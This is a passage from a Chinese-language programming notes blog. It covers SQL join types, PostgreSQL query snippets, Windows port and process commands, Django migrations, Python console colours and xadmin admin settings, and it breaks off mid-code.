plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">d = &#123;&#x27;a&#x27;: 1, &#x27;b&#x27;: 2, &#x27;c&#x27;: 3, &#x27;d&#x27;: 5&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">print(&#x27;&#123;a&#125;,&#123;b&#125;&#x27;.format(**d))</span><br><span class=\"line\">print(&#x27;&#123;0&#125;,&#123;1&#125;,&#123;0&#125;&#x27;.format(&#x27;a&#x27;, &#x27;b&#x27;))</span><br><span class=\"line\">print(f&quot;&#123;d[&#x27;a&#x27;]&#125;&quot;)</span><br></pre></td></tr></table></figure>\n\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">1,2</span><br><span class=\"line\">a,b,a</span><br><span class=\"line\">1</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"81、数据库inner-join、full-join、left-join、union、union-all区别\"><a href=\"#81、数据库inner-join、full-join、left-join、union、union-all区别\" class=\"headerlink\" title=\"81、数据库inner join、full join、left join、union、union all区别\"></a>81、数据库inner join、full join、left join、union、union all区别</h2><p>表a_test</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20200529102527295.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>表b_test</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20200529102549669.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>INNER JOIN</p>\n<p>是A和B的交集</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT * FROM a_test INNER JOIN b_test ON a_test.name = b_test.namesa</span><br><span class=\"line\"></span><br><span class=\"line\">Inner join 产生的结果集中，是A和B的交集。</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://img-blog.csdnimg.cn/20200529102631494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>FULL OUTER JOIN</p>\n<p>产生A和B的并集</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT * FROM a_test FULL OUTER JOIN b_test ON a_test.name = b_test.name </span><br><span class=\"line\"></span><br><span class=\"line\">Full outer join 产生A和B的并集。</span><br><span class=\"line\">但是需要注意的是，对于没有匹配的记录，则会以null做为值。</span><br><span class=\"line\">可以使用IF NULL判断。</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://img-blog.csdnimg.cn/20200529102702865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT * FROM a_test FULL OUTER JOIN b_test ON a_test.name = b_test.name</span><br><span class=\"line\">WHERE a_test.id IS null OR b_test.id IS null</span><br><span class=\"line\"></span><br><span class=\"line\">产生A表和B表没有交集的数据集。</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://img-blog.csdnimg.cn/20200529102724731.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>LEFT [OUTER] JOIN</p>\n<p>产生表A的完全集，而B表中匹配的则有值，没有匹配的则以null值取代</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT * FROM a_test LEFT OUTER JOIN b_test ON a_test.name = b_test.name</span><br><span class=\"line\">有些数据库可以不要OUTER</span><br><span class=\"line\">SELECT * FROM a_test LEFT  JOIN b_test ON a_test.name = b_test.name</span><br><span class=\"line\">Left outer join 产生表A的完全集，而B表中匹配的则有值，没有匹配的则以null值取代。</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://img-blog.csdnimg.cn/20200529102808618.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT * FROM a_test LEFT OUTER JOIN b_test ON a_test.name = b_test.name </span><br><span class=\"line\">WHERE b_test.id IS null</span><br><span class=\"line\"></span><br><span class=\"line\">产生在A表中有而在B表中没有的集合。</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://img-blog.csdnimg.cn/20200529102828846.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>RIGHT [OUTER] JOIN</p>\n<p>RIGHT OUTER JOIN 是后面的表为基础，与LEFT OUTER JOIN用法类似。</p>\n<p>UNION 与 UNION ALL</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">UNION 操作符用于合并两个或多个 SELECT 语句的结果集。</span><br><span class=\"line\">请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。</span><br><span class=\"line\">列也必须拥有相似的数据类型。</span><br><span class=\"line\">同时，每条 SELECT 语句中的列的顺序必须相同。</span><br><span class=\"line\">UNION 只选取记录，而UNION ALL会列出所有记录。</span><br><span class=\"line\"></span><br><span class=\"line\">SELECT name FROM a_test UNION SELECT name FROM b_test</span><br><span class=\"line\"></span><br><span class=\"line\">选取不同值</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://img-blog.csdnimg.cn/20200529102855430.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT a_test.id,a_test.name  FROM a_test </span><br><span class=\"line\">UNION </span><br><span class=\"line\">SELECT b_test.id,b_test.name FROM b_test</span><br><span class=\"line\"></span><br><span class=\"line\">由于 id 51 xh   与 id 4 xh 并不相同，不合并</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://img-blog.csdnimg.cn/20200529102917488.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT name FROM a_test UNION ALL SELECT name FROM b_test</span><br><span class=\"line\"></span><br><span class=\"line\">全部列出来</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://img-blog.csdnimg.cn/20200529102937801.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>还需要注意的是我们还有一个是“交差集” cross join, 这种Join没有办法用文式图表示，因为其就是把表A和表B的数据进行一个N*M的组合，即笛卡尔积。</p>\n<p>表达式如下：SELECT * FROM a_test CROSS JOIN b_test</p>\n<p>这个笛卡尔乘积会产生 4 x 4 = 16 条记录，一般来说，我们很少用到这个语法。但是我们得小心，如果不是使用嵌套的select语句，一般系统都会产生笛卡尔乘积然再做过滤。这是对于性能来说是非常危险的，尤其是表很大的时候。</p>\n<h2 id=\"82、windows电脑查看端口使用情况\"><a href=\"#82、windows电脑查看端口使用情况\" class=\"headerlink\" title=\"82、windows电脑查看端口使用情况\"></a>82、windows电脑查看端口使用情况</h2><p>找出8000端口对应的PID进程，命令为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">netstat -ano|findstr 8000</span><br></pre></td></tr></table></figure>\n\n<p>进程信息如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       1620</span><br><span class=\"line\">UDP    0.0.0.0:8000           *:*                                    1620</span><br></pre></td></tr></table></figure>\n\n<p>找出进程对应的详细信息：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">tasklist |findstr 1620</span><br><span class=\"line\"></span><br><span class=\"line\">KGService.exe                 1620 Console                    1     18,696 K</span><br></pre></td></tr></table></figure>\n\n<p>关进程：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">taskkill /pid 1620 /F</span><br></pre></td></tr></table></figure>\n\n<p>查看程序占用内存<br>比如查看python占用运行内存</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">tasklist  /fi &quot;imagename eq python.exe&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://img-blog.csdnimg.cn/a61afd069e964e6f9d755c5c1884ca6f.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"83、Django生成表和反向生成Model\"><a href=\"#83、Django生成表和反向生成Model\" class=\"headerlink\" title=\"83、Django生成表和反向生成Model\"></a>83、Django生成表和反向生成Model</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">正向生成：</span><br><span class=\"line\">python manage.py makemigrations</span><br><span class=\"line\">python manage.py migrate</span><br><span class=\"line\"></span><br><span class=\"line\">反向：</span><br><span class=\"line\">会根据设置的数据库中的表在自动生成对应的Model代码，并打印出来</span><br><span class=\"line\">python manage.py inspectdb</span><br><span class=\"line\"></span><br><span class=\"line\">以直接将打印的代码直接导入到指定的Model文件中</span><br><span class=\"line\">python manage.py inspectdb &gt; models.py</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"84、windows的hosts文件位置\"><a href=\"#84、windows的hosts文件位置\" class=\"headerlink\" title=\"84、windows的hosts文件位置\"></a>84、windows的hosts文件位置</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Windows\\System32\\drivers\\etc\\hosts</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"85、postgresql数据库\"><a href=\"#85、postgresql数据库\" class=\"headerlink\" title=\"85、postgresql数据库\"></a>85、postgresql数据库</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 如果表存在就先删除</span><br><span class=\"line\">drop table if exists student;</span><br><span class=\"line\"># 创建学生表</span><br><span class=\"line\"># id      serial not null  表示id自增</span><br><span class=\"line\"># id      integer not null  表示id不自增</span><br><span class=\"line\">create table student</span><br><span class=\"line\">(</span><br><span class=\"line\">    id                    serial not null</span><br><span class=\"line\">        constraint student_pk</span><br><span class=\"line\">            primary key,</span><br><span class=\"line\">    name                  varchar,</span><br><span class=\"line\">    class_id              integer,</span><br><span class=\"line\">    height                numeric,</span><br><span class=\"line\">    weight                numeric,</span><br><span class=\"line\">    write_date            timestamp</span><br><span class=\"line\">    </span><br><span class=\"line\">);</span><br><span class=\"line\"></span><br><span class=\"line\">comment on table student is &#x27;学生表&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">comment on column student.name is &#x27;名称&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">comment on column student.class_id is &#x27;班级ID&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">comment on column student.height is &#x27;身高&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">comment on column student.weight is &#x27;体重&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">comment on column student.write_date is &#x27;修改时间&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\">alter table student</span><br><span class=\"line\">    owner to odoo;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># 更新</span><br><span class=\"line\">update user set name=&#x27;张三&#x27; where id=111</span><br><span class=\"line\"></span><br><span class=\"line\"># 更新表a的字段为表b的值</span><br><span class=\"line\">update account_invoice </span><br><span class=\"line\">set sale_order_id=so.id </span><br><span class=\"line\">from sale_order so </span><br><span class=\"line\">where account_invoice.origin=so.name</span><br><span class=\"line\"></span><br><span class=\"line\"># 新增</span><br><span class=\"line\">insert into &quot;user&quot; (name,sex) values (&#x27;小明&#x27;,1),(&#x27;小红&#x27;, 0)</span><br><span class=\"line\"># 新增或更新</span><br><span class=\"line\">如果id冲突就更新</span><br><span class=\"line\">INSERT INTO  student(id, name)</span><br><span class=\"line\">   VALUES(12, &#x27;小明&#x27;),(13, &#x27;小红&#x27;)</span><br><span class=\"line\">   ON conflict(id) DO UPDATE</span><br><span class=\"line\">   SET name =&#x27;未知&#x27;;</span><br><span class=\"line\">如果id冲突就什么也不做</span><br><span class=\"line\">INSERT INTO  student(id, name)</span><br><span class=\"line\">   VALUES(12, &#x27;小明&#x27;),(13, &#x27;小红&#x27;)</span><br><span class=\"line\">   ON conflict(id) DO NOTHING;</span><br><span class=\"line\"></span><br><span class=\"line\"># 把一个表中的数据插入到另一个表中</span><br><span class=\"line\">insert into 目标表名 (column1,column2,columnn) select value1,value2,valuen from  源表名</span><br><span class=\"line\">比如：</span><br><span class=\"line\">insert into student (name, classs_name,create_date) select  student_name as name, class_name, now() from class_table;</span><br><span class=\"line\"></span><br><span class=\"line\"># 获取当前时间</span><br><span class=\"line\">now()</span><br><span class=\"line\">select now()</span><br><span class=\"line\"></span><br><span class=\"line\"># 删除</span><br><span class=\"line\">DELETE FROM table_name [WHERE Clause]</span><br><span class=\"line\"></span><br><span class=\"line\"># 增加字段</span><br><span class=\"line\">alter table 表名 add column 列名 类型;</span><br><span class=\"line\"># 删除字段</span><br><span class=\"line\">alter table 表名 dropcolumn 列名 ;</span><br><span class=\"line\"></span><br><span class=\"line\"># postgresql数据库查看表所有字段</span><br><span class=\"line\">select * from information_schema.columns where table_schema=&#x27;public&#x27; and table_name=&#x27;表名&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\"># postgresql获取所有表名</span><br><span class=\"line\">select tablename from pg_tables where schemaname=&#x27;public&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"># 对查询结果按id降序显示</span><br><span class=\"line\">select * from table_name order by id desc</span><br><span class=\"line\"></span><br><span class=\"line\"># 对查询结果按id升序显示</span><br><span class=\"line\">select * from table_name order by id asc</span><br><span class=\"line\"></span><br><span class=\"line\"># 转义字符, 查找name中包含单引号的记录</span><br><span class=\"line\">select * from student where name like  E&#x27;%\\&#x27;%&#x27;;</span><br><span class=\"line\"></span><br><span class=\"line\"># 查看表记录总数</span><br><span class=\"line\">select relname as TABLE_NAME, reltuples as rowCounts from pg_class where relkind = &#x27;r&#x27; and relnamespace = (select oid from pg_namespace where nspname=&#x27;public&#x27;) order by rowCounts desc;</span><br><span class=\"line\"></span><br><span class=\"line\"># 将结果转换为数组</span><br><span class=\"line\">SELECT array(SELECT &quot;name&quot; FROM sale_order);</span><br><span class=\"line\"></span><br><span class=\"line\"># 将数组合并为字符串</span><br><span class=\"line\">select array_to_string(array[1,2,3], &#x27;,&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 联合子集更新，把sale_order_line的name连接换行符，然后按id更新到表a_test中对应的name</span><br><span class=\"line\">update a_test set name=array_to_string(array(select name from sale_order_line where order_id=a_test.id),&#x27;&lt;br/&gt;&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\"># PostgreSQL合并查询同一列的多条记录，针对一对多，多对多字段</span><br><span class=\"line\">比如表：</span><br><span class=\"line\"></span><br><span class=\"line\">id   name                  </span><br><span class=\"line\">1    小明                   </span><br><span class=\"line\">1    小红                     id   name</span><br><span class=\"line\">1    小亮        --&gt;          1    小明，小亮，小红</span><br><span class=\"line\">2    小强                     2    小强，小王</span><br><span class=\"line\">2    小王</span><br><span class=\"line\"></span><br><span class=\"line\">SELECT </span><br><span class=\"line\">    id, array_to_string(ARRAY(SELECT unnest(array_agg(name order by name desc))),&#x27;,&#x27;) AS all_name</span><br><span class=\"line\">FROM  </span><br><span class=\"line\">    student</span><br><span class=\"line\">GROUP BY id;</span><br><span class=\"line\"></span><br><span class=\"line\"># case语句</span><br><span class=\"line\">case var</span><br><span class=\"line\">\twhen condition1 then statement1</span><br><span class=\"line\">\twhen condition2 then statement2</span><br><span class=\"line\">else statementn</span><br><span class=\"line\">end as new_name</span><br><span class=\"line\"></span><br><span class=\"line\">比如：</span><br><span class=\"line\">select case name</span><br><span class=\"line\">\twhen &#x27;小明&#x27; then &#x27;xm&#x27;</span><br><span class=\"line\">\twhen &#x27;小红&#x27; then &#x27;xh&#x27;</span><br><span class=\"line\">\twhen &#x27;小刚&#x27; then &#x27;xg&#x27;</span><br><span class=\"line\">else &#x27;xw&#x27;</span><br><span class=\"line\">end as short_name</span><br><span class=\"line\">from student</span><br><span class=\"line\"></span><br><span class=\"line\"># 临时表、字符串合并、类型转换、时间格式转换、当前时间</span><br><span class=\"line\">WITH TEMP AS ( </span><br><span class=\"line\">\tSELECT CAST ( concat ( bam.account_period_code, &#x27;-01&#x27; ) AS TIMESTAMP ) </span><br><span class=\"line\">\t   AS account_period_time </span><br><span class=\"line\">\t\t FROM bi_account_move AS bam ) </span><br><span class=\"line\">SELECT</span><br><span class=\"line\">\taccount_period_time,</span><br><span class=\"line\">\tto_char(CURRENT_DATE,&#x27;yyyy-MM-dd hh24:MI:ss&#x27;) as current_date,</span><br><span class=\"line\">\tto_char( account_period_time, &#x27;yyyy&#x27; ) as year,</span><br><span class=\"line\">\tto_char( account_period_time, &#x27;MM&#x27; ) as month,</span><br><span class=\"line\">\tto_char( account_period_time, &#x27;dd&#x27; ) as day </span><br><span class=\"line\">FROM TEMP</span><br><span class=\"line\"></span><br><span class=\"line\">比如：</span><br><span class=\"line\">account_period_time\tcurrent_date\t    year\tmonth\tday</span><br><span class=\"line\">2019-06-01 0:00:00\t2020-06-24 00:00:00\t2019\t 06\t     01</span><br><span class=\"line\">2019-06-01 0:00:00\t2020-06-24 00:00:00\t2019\t 06\t     01</span><br><span class=\"line\"></span><br><span class=\"line\"># 多个字符串拼接</span><br><span class=\"line\">select </span><br><span class=\"line\">concat(&#x27;payment_&#x27;, CAST(ap.id as varchar)) as line_key</span><br><span class=\"line\">from ap</span><br><span class=\"line\"></span><br><span class=\"line\"># 将查询所得结果集的某一字段拼接成字符串，默认的是逗号</span><br><span class=\"line\">select GROUP_CONCAT(id) from test where id&gt;5;</span><br><span class=\"line\">结果为：</span><br><span class=\"line\">1,2,3,4,5,6,7</span><br><span class=\"line\"># 使用其他分隔符拼接</span><br><span class=\"line\">select GROUP_CONCAT(id separator &#x27;-&#x27;) from test where id&gt;5;</span><br><span class=\"line\">结果为：</span><br><span class=\"line\">1-2-3-4-5-6-7</span><br><span class=\"line\"># 多个临时表</span><br><span class=\"line\">WITH temp_student AS ( SELECT ID, NAME, sex FROM student WHERE sex = TRUE ),</span><br><span class=\"line\">temp_class AS (</span><br><span class=\"line\">\tSELECT</span><br><span class=\"line\">\t\tID,</span><br><span class=\"line\">\t\tNAME,</span><br><span class=\"line\">\t\tstudent_id,</span><br><span class=\"line\">\t\tteacher_id</span><br><span class=\"line\">\tFROM</span><br><span class=\"line\">\t\tthe_class </span><br><span class=\"line\">\t),</span><br><span class=\"line\">\ttemp_teacher AS (</span><br><span class=\"line\">\tSELECT </span><br><span class=\"line\">\t  ID,</span><br><span class=\"line\">\t\tNAME,</span><br><span class=\"line\">\t\tage </span><br><span class=\"line\">\tFROM</span><br><span class=\"line\">\t\tteacher </span><br><span class=\"line\">\t) </span><br><span class=\"line\">\tSELECT</span><br><span class=\"line\">\tts.NAME AS student_name,</span><br><span class=\"line\">\ttc.NAME AS class_name,</span><br><span class=\"line\">\tte.NAME AS teacher_name</span><br><span class=\"line\">\tfrom temp_student as ts</span><br><span class=\"line\">\tLEFT JOIN temp_class AS tc ON tc.student_id = ts.ID  </span><br><span class=\"line\">\tLEFT JOIN teacher AS te ON te.id = tc.teacher_id  </span><br><span class=\"line\"></span><br><span class=\"line\"># null转成有意义的值</span><br><span class=\"line\">select COALESCE(name, &#x27;&#x27;) as name from a_test</span><br><span class=\"line\">意思就是如果name为null，就转为空字符串</span><br><span class=\"line\"></span><br><span class=\"line\"># 字符串截取</span><br><span class=\"line\">select SUBSTRING(&#x27;abcd&#x27;,1,2); -- result:ab 表示从下标从1开始,截取2个字符</span><br><span class=\"line\"></span><br><span class=\"line\"># 使用 interval 时间相加减(+/-)</span><br><span class=\"line\">当前时间 + 10秒，</span><br><span class=\"line\">select to_char(now() + interval &#x27;10 second&#x27;, &#x27;yyyy-mm-dd hh24:mi:ss&#x27;)  as reqDate from account_period;</span><br><span class=\"line\">当前时间 - 10秒</span><br><span class=\"line\">select to_char(now() + interval &#x27;-10 second&#x27;, &#x27;yyyy-mm-dd hh24:mi:ss&#x27;)  as reqDate from account_period;</span><br><span class=\"line\"> </span><br><span class=\"line\">当前时间 + 10分，</span><br><span class=\"line\">select to_char(now() + interval &#x27;10 minute&#x27;, &#x27;yyyy-mm-dd hh24:mi:ss&#x27;)  as reqDate  from account_period;</span><br><span class=\"line\"> </span><br><span class=\"line\">当前时间 + 10时，</span><br><span class=\"line\">select to_char(now() + interval &#x27;10 hour&#x27;, &#x27;yyyy-mm-dd hh24:mi:ss&#x27;)  as reqDate from account_period;</span><br><span class=\"line\"> </span><br><span class=\"line\">当前时间 + 10天，</span><br><span class=\"line\">select to_char(now() + interval &#x27;10 day&#x27;, &#x27;yyyy-mm-dd hh24:mi:ss&#x27;)  as reqDate from account_period;</span><br><span class=\"line\"></span><br><span class=\"line\">当前时间 + 10年，</span><br><span class=\"line\">select to_char(now() + interval &#x27;10 year&#x27;, &#x27;yyyy-mm-dd hh24:mi:ss&#x27;)  as reqDate from account_period;</span><br><span class=\"line\"></span><br><span class=\"line\"># UNION types numeric and text cannot be matched</span><br><span class=\"line\">NULL::NUMERIC</span><br><span class=\"line\"> 这个问题，是因为几个sql组合在一起时，同一个字段的值，遇到null时，需要进行类型转换。</span><br><span class=\"line\"></span><br><span class=\"line\"># 对行记录定义行编号，使用函数ROW_NUMBER()</span><br><span class=\"line\"># 按分数进行降序，然后给行记录标记行编号，可以作为排名来使用</span><br><span class=\"line\">select           </span><br><span class=\"line\">\tROW_NUMBER() OVER (ORDER BY score desc) AS sequence_number,</span><br><span class=\"line\">\tname,score</span><br><span class=\"line\">from</span><br><span class=\"line\">\tb_test</span><br><span class=\"line\"></span><br><span class=\"line\"># 数字转字符串  </span><br><span class=\"line\">select cast(123 as VARCHAR); </span><br><span class=\"line\"></span><br><span class=\"line\"># 字符串转数字  </span><br><span class=\"line\">select cast(&#x27;123&#x27; as INTEGER);</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"86、python控制台输出带颜色的文字方法\"><a href=\"#86、python控制台输出带颜色的文字方法\" class=\"headerlink\" title=\"86、python控制台输出带颜色的文字方法\"></a>86、python控制台输出带颜色的文字方法</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">#格式：　　设置颜色开始 ：\\033[显示方式;前景色;背景色m</span><br><span class=\"line\">#说明：</span><br><span class=\"line\">前景色            背景色           颜色</span><br><span class=\"line\">---------------------------------------</span><br><span class=\"line\">30                40              黑色</span><br><span class=\"line\">31                41              红色</span><br><span class=\"line\">32                42              绿色</span><br><span class=\"line\">33                43              黃色</span><br><span class=\"line\">34                44              蓝色</span><br><span class=\"line\">35                45              紫红色</span><br><span class=\"line\">36                46              青蓝色</span><br><span class=\"line\">37                47              白色</span><br><span class=\"line\">显示方式           意义</span><br><span class=\"line\">-------------------------</span><br><span class=\"line\">0                终端默认设置</span><br><span class=\"line\">1                高亮显示</span><br><span class=\"line\">4                使用下划线</span><br><span class=\"line\">5                闪烁</span><br><span class=\"line\">7                反白显示</span><br><span class=\"line\">8                不可见</span><br><span class=\"line\"> </span><br><span class=\"line\">#例子：</span><br><span class=\"line\">\\033[1;31;40m    &lt;!--1-高亮显示 31-前景色红色  40-背景色黑色--&gt;</span><br><span class=\"line\">\\033[0m          &lt;!--采用终端默认设置，即取消颜色设置--&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">例子</span><br><span class=\"line\">print(&#x27;紫红字体 \\033[1;35m hello world \\033[0m!&#x27;)</span><br><span class=\"line\">print(&#x27;褐色背景绿色字体 \\033[1;32;43m hello world \\033[0m!&#x27;)</span><br><span class=\"line\">print(&#x27;\\033[1;33;44mhello world\\033[0m&#x27;)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://img-blog.csdnimg.cn/20200615143709116.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"87、控制台输出白色方框\"><a href=\"#87、控制台输出白色方框\" class=\"headerlink\" title=\"87、控制台输出白色方框\"></a>87、控制台输出白色方框</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">print(&#x27;█&#x27;)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"88、xadmin后台编辑多对多字段\"><a href=\"#88、xadmin后台编辑多对多字段\" class=\"headerlink\" title=\"88、xadmin后台编辑多对多字段\"></a>88、xadmin后台编辑多对多字段</h2><p>在models.py定义了多对多字段，想要在编辑时可以灵活使用这个字段的话，可以按以下方法设置：<br>modes.py</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">class Book(models.Model):</span><br><span class=\"line\">    title = models.CharField(verbose_name=&quot;书名&quot;, max_length=32)</span><br><span class=\"line\">    second_title = models.CharField(verbose_name=&quot;副标题&quot;, max_length=32, blank=True, null=True)</span><br><span class=\"line\">    author = models.CharField(verbose_name=&quot;作者&quot;, max_length=32)</span><br><span class=\"line\">    translator = models.CharField(verbose_name=&quot;译者&quot;, max_length=32, blank=True, null=True)</span><br><span class=\"line\">    intro = models.TextField(verbose_name=&quot;描述&quot;)</span><br><span class=\"line\">    pic = models.FileField(verbose_name=&quot;封面图片&quot;, max_length=64, upload_to=&#x27;book_cover&#x27;, null=True, blank=True)</span><br><span class=\"line\">    tags = models.ManyToManyField(Tags, verbose_name=&#x27;书籍标签&#x27;, blank=True)</span><br><span class=\"line\">    prizes = models.ManyToManyField(Prizes, verbose_name=&#x27;获奖详情&#x27;, blank=True)</span><br><span class=\"line\">    sump = models.IntegerField(verbose_name=&quot;收藏人数&quot;, default=0)</span><br><span class=\"line\">    rate_num = models.IntegerField(verbose_name=&quot;评分人数&quot;, default=0)</span><br><span class=\"line\">    num = models.IntegerField(verbose_name=&quot;浏览量&quot;, default=0)</span><br><span class=\"line\">    published_time = models.DateField(blank=True, null=True, verbose_name=&#x27;出版时间&#x27;)</span><br><span class=\"line\">    create_time = models.DateTimeField(auto_now_add=True, verbose_name=&#x27;创建时间&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    class Meta:</span><br><span class=\"line\">        db_table = &#x27;book&#x27;</span><br><span class=\"line\">        verbose_name = &quot;图书&quot;</span><br><span class=\"line\">        verbose_name_plural = &quot;图书&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">    def __str__(self):</span><br><span class=\"line\">        return self.title</span><br></pre></td></tr></table></figure>\n\n<p>adminx.py</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 书籍管理</span><br><span class=\"line\">class BookAdmin(object):</span><br><span class=\"line\">    search_fields = [&#x27;title&#x27;, &#x27;author&#x27;, &#x27;intro&#x27;]  # 检索字段</span><br><span class=\"line\">    list_display = [&#x27;id&#x27;, &#x27;show_pic&#x27;, &#x27;title&#x27;, &#x27;second_title&#x27;, &#x27;author&#x27;, &#x27;translator&#x27;, &#x27;published_time&#x27;, &#x27;intro&#x27;,</span><br><span class=\"line\">                    &#x27;tags&#x27;, &#x27;prizes&#x27;, &#x27;num&#x27;, &#x27;sump&#x27;, &#x27;rate_num&#x27;]  # 要显示的字段</span><br><span class=\"line\">    list_filter = [&#x27;published_time&#x27;, &#x27;tags&#x27;, &#x27;prizes&#x27;]  # 分组过滤的字段</span><br><span class=\"line\">    ordering = (&#x27;id&#x27;,)  # 设置默认排序字段，负号表示降序排序</span><br><span class=\"line\">    list_per_page = 30  # 默认每页显示多少条记录，默认是100条</span><br><span class=\"line\">    model_icon = &#x27;fa fa-book&#x27;  # 左侧小图标</span><br><span class=\"line\">    list_editable = [&#x27;title&#x27;, &#x27;author&#x27;, &#x27;intro&#x27;, &#x27;published_time&#x27;]  # 可编辑字段</span><br><span class=\"line\">    style_fields = &#123;&#x27;tags&#x27;: &#x27;m2m_transfer&#x27;, &#x27;prizes&#x27;: &#x27;m2m_transfer&#x27;&#125;  # 控制字段的显示样式</span><br><span class=\"line\">    filter_horizontal = (&#x27;tags&#x27;, &#x27;prizes&#x27;)  # 水平选择编辑多对多字段</span><br></pre></td></tr></table></figure>\n\n<p>重点是设置style_fields 和filter_horizontal ，效果：</p>\n<p><img src=\"https://img-blog.csdnimg.cn/20200621214122315.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xtX2lzX2Rj,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"89、Django后台通过按钮显示TextField字段内容\"><a href=\"#89、Django后台通过按钮显示TextField字段内容\" class=\"headerlink\" title=\"89、Django后台通过按钮显示TextField字段内容\"></a>89、Django后台通过按钮显示TextField字段内容</h2><p>由于TextField字段类型内容可能很长，在后台显示时很占屏幕位置，可以通过按钮来控制显示，代码如下：<br>models.py中定义了一个TextField字段类型：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">class Prizes(models.Model):</span><br><span class=\"line\">    name = models.CharField(max_length=32, verbose_name=&quot;奖项&quot;)</span><br><span class=\"line\">    intro = models.TextField(blank=True, null=True, verbose_name=&#x27;简介&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    class Meta:</span><br><span class=\"line\">        db_table = &#x27;prizes&#x27;</span><br><span class=\"line\">        verbose_name = &quot;奖项&quot;</span><br><span class=\"line\">        verbose_name_plural = &quot;奖项&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">    def __str__(self):</span><br><span class=\"line\">        return 